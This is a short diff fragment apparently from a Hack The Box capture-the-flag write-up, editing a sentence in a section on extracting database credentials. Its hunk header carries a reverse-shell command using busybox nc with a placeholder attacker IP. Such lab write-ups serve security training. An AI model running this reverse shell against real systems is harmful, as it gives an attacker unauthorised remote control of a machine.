@@ -1129,7 +1129,7 @@ busybox nc <YOUR_IP> 4444 -e /bin/sh
 
 ##### 3.2.2 Database Credential Extraction
 
-Once the shell connects, query the DB(`reactor.db`) we found:
+The database was queried directly via `rce.py`.
 
 ```shell
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
